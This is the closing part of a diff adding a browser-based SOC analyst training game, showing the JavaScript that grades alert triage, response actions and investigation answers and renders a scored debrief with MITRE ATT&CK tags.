+ <p>${S.alerts.length} alerts · <b style="color:${un?'var(--warn)':'var(--ok)'}">${un} untriaged</b> · <b style="color:${ucl?'var(--warn)':'var(--ok)'}">${ucl} true positives not classified</b> · ${S.executed.length} response actions taken</p>
+ ${un||ucl?`<button class="btn sm" onclick="show('alerts')">Go to alerts</button>`:''}</div>
+ ${single?`<div class="card"><h2>Investigation questions</h2>${S.incs[0].g.questions.map((q,j)=>`<label class="small">${esc(q.q)}</label><input class="mono" style="margin:4px 0 10px" value="${esc(S.answers['0_'+j]||'')}" oninput="S.answers['0_${j}']=this.value">`).join('')}</div>
+ <div class="card"><h2>Hints <span class="small muted">(−5 points each)</span></h2>${S.incs[0].g.hints.slice(0,S.hints).map(h=>`<div class="hint">💡 ${esc(h)}</div>`).join('')}${S.hints<S.incs[0].g.hints.length?`<button class="btn sm" onclick="S.hints++;render()">Reveal hint ${S.hints+1}/${S.incs[0].g.hints.length}</button>`:''}</div>`:''}
+ <div class="card"><label class="small">Analyst notes (not scored — practise writing a shift handover)</label><textarea oninput="S.notes=this.value" placeholder="Per incident: what happened, evidence, actions taken, follow-ups…">${esc(S.notes)}</textarea>
+ <button class="btn pri" style="margin-top:10px" onclick="submitReport()">Submit &amp; get score</button></div>`}
+function checkQ(q,a){a=(a||'').trim();if(q.num!=null)return Math.abs(parseFloat(a)-q.num)<=q.tol;if(q.time!=null){const m=a.match(/(\d{1,2})[:.](\d{2})/);if(!m)return false;const mins=(+m[1]-9)*60+ +m[2];return Math.abs(mins-q.time)<=2}return matchAny(a,q.a)}
+function expQ(q){return q.num!=null?String(q.num):q.time!=null?fmtT(T(q.time)).slice(0,5):q.a[0]}
+function gradeMulti(){const items=[];let score=0,max=0;
+ const add=(ok,pts,label,detail,penalty)=>{if(penalty){score-=pts;items.push({ok:false,pts:-pts,label,detail});return}max+=pts;if(ok)score+=pts;items.push({ok,pts:ok?pts:0,max:pts,label,detail})};
+ const did=(a,v)=>S.executed.some(x=>x.a===a&&matchAny(x.p,v));
+ if(S.incs.length===1)S.incs[0].g.questions.forEach((q,j)=>{const a=S.answers['0_'+j]||'',ok=checkQ(q,a);add(ok,10,esc(q.q),ok?'Correct: '+esc(a):`Your answer: ${esc(a||'—')} · Expected: <b>${esc(expQ(q))}</b>`)});
+ S.alerts.filter(a=>a.builtin).forEach(a=>{const exp=a.mal?'TP':'FP',got=S.triage[a.id],nm=esc(a.rule.name)+' <span class="muted">'+esc(Object.values(a.by).join(' / '))+'</span>';
+  add(got===exp,5,'Triage: '+nm,`Expected <b>${exp}</b>${got?'':' · not triaged'}`);
+  if(a.mal){const ty=S.incs[a.inc].def.type;add(S.cls[a.id]===ty,5,'Classify: '+nm,`Expected: <b>${esc(ty)}</b>${S.cls[a.id]&&S.cls[a.id]!==ty?' · you chose '+esc(S.cls[a.id]):''}`)}});
+ S.incs.forEach(({def,g})=>{const n=esc(def.name);
+  g.required.forEach(([a,v])=>add(did(a,v),10,`Required — ${n}: ${ACTIONS[a].label}`,v==='*'?'any target':'target: '+esc([].concat(v)[0])));
+  g.recommended.forEach(([a,v])=>add(did(a,v),5,`Recommended — ${n}: ${ACTIONS[a].label}`,v==='*'?'any target':'target: '+esc([].concat(v)[0])));
+  (g.forbidden||[]).forEach(([a,v])=>{if(did(a,v))add(0,15,`Harmful — ${n}: ${ACTIONS[a].label}`,'This disrupted a legitimate activity',true)})});
+ const forbIPs=S.incs.flatMap(x=>(x.g.forbidden||[]).filter(f=>f[0]==='block_ip').flatMap(f=>[].concat(f[1])));
+ S.executed.filter(x=>x.a==='block_ip'&&x.p.startsWith('10.')&&!forbIPs.includes(x.p)).forEach(x=>add(0,10,'Blocked internal IP '+esc(x.p),'Internal blocks can cause outages',true));
+ if(S.hints)add(0,5*S.hints,`Hints used (${S.hints})`,'',true);
+ score=Math.max(0,score);const pct=max?Math.round(score/max*100):0;S.result={score,max,pct,items};
+ if(store[S.key]==null||pct>store[S.key]){store[S.key]=pct;saveBest()}render()}
+
+function submitReport(){if(S.mode==='multi')return gradeMulti();const t=S.truth,items=[];let score=0,max=0;
+ const add=(ok,pts,label,detail,penalty)=>{if(penalty){score-=pts;items.push({ok:false,pts:-pts,label,detail});return}max+=pts;if(ok)score+=pts;items.push({ok,pts:ok?pts:0,max:pts,label,detail})};
+ t.questions.forEach(q=>{const a=(S.answers[q.id]||'').trim();const ok=q.num!=null?Math.abs(parseFloat(a)-q.num)<=q.tol:matchAny(a,q.a);add(ok,10,q.q,ok?'Correct: '+esc(a):`Your answer: ${esc(a||'—')} · Expected: <b>${esc(q.num!=null?q.num+' GB':q.a[0])}</b>`)});
+ add(S.verdict===t.verdict,20,'Final verdict',`Expected: <b>${t.verdict==='TP'?'True positive':'False positive'}</b>${S.verdict?'':' (you did not choose)'}`);
+ S.alerts.filter(a=>a.builtin).forEach(a=>{const exp=a.mal?'TP':'FP',got=S.triage[a.id];add(got===exp,5,'Alert triage: '+esc(a.rule.name)+' '+esc(Object.values(a.by).join(' / ')),`Expected ${exp}${got?'':' · not triaged'}`)});
+ const did=(a,v)=>S.executed.some(x=>x.a===a&&matchAny(x.p,v));
+ t.required.forEach(([a,v])=>add(did(a,v),10,'Required: '+ACTIONS[a].label,v==='*'?'any target':'target: '+esc([].concat(v)[0])));
+ t.recommended.forEach(([a,v])=>add(did(a,v),5,'Recommended: '+ACTIONS[a].label,'target: '+esc([].concat(v)[0])));
+ t.forbidden.forEach(([a,v])=>{if(did(a,v))add(0,15,'Harmful: '+ACTIONS[a].label,'This disrupted a legitimate business process',true)});
+ const forbIPs=t.forbidden.filter(f=>f[0]==='block_ip').flatMap(f=>[].concat(f[1]));
+ S.executed.filter(x=>x.a==='block_ip'&&x.p.startsWith('10.')&&!forbIPs.includes(x.p)).forEach(x=>add(0,10,'Blocked internal IP '+esc(x.p),'Internal blocks can cause outages',true));
+ if(S.hints)add(0,5*S.hints,`Hints used (${S.hints})`,'',true);
+ score=Math.max(0,score);const pct=Math.round(score/max*100);S.result={score,max,pct,items};
+ if(store[S.sc.id]==null||pct>store[S.sc.id]){store[S.sc.id]=pct;saveBest()}render()}
+function resultView(){const r=S.result,t=S.truth,rank=r.pct>=90?'Threat Hunter':r.pct>=75?'SOC Analyst L2':r.pct>=50?'SOC Analyst L1':'Trainee';
+ return `<div class="card" style="text-align:center"><div class="muted small">${esc(S.sc.name)} · case #${S.seed%10000}</div><div class="big" style="color:${r.pct>=75?'var(--ok)':r.pct>=50?'var(--warn)':'var(--bad)'}">${r.pct}%</div><div>${r.score} / ${r.max} points · <b>${rank}</b></div>
+ <div class="row" style="justify-content:center;margin-top:10px"><button class="btn" onclick="S.result=null;render()">Edit report</button><button class="btn pri" onclick="restart()">Retry (new variant)</button><button class="btn" onclick="show('missions')">Next mission</button></div></div>
+ ${S.mode==='multi'?S.incs.map(({def,g})=>`<div class="card"><div class="row"><h2 class="grow" style="margin:0">${esc(def.name)}</h2><span class="sev ${def.fp?'low':'high'}">${def.fp?'False positive':'True positive'}</span></div><div style="margin:6px 0"><span class="tag" style="color:var(--accent)">${esc(def.tag)}</span> <span class="tag">${esc(def.type)}</span></div><p>${g.story}</p>${g.tags.map(m=>`<span class="tag" style="margin:2px">${esc(m)}</span>`).join(' ')}</div>`).join(''):`<div class="card"><h2>Debrief — what really happened</h2><p>${t.story}</p><h3>MITRE ATT&amp;CK</h3>${t.mitre.map(m=>`<span class="tag" style="margin:2px">${esc(m)}</span>`).join(' ')}</div>`}
+ <div class="card"><h2>Breakdown</h2>${r.items.map(x=>`<div class="res-item"><span>${x.pts<0?'⚠️':x.ok?'✅':'❌'}</span><div class="grow"><div>${x.label}</div><div class="small muted">${x.detail}</div></div><span class="mono small" style="color:${x.pts<0?'var(--bad)':x.ok?'var(--ok)':'var(--muted)'}">${x.pts<0?x.pts:x.pts+'/'+x.max}</span></div>`).join('')}</div>`}
+
+renderNav();render();
+</script>
+</body>
+</html>
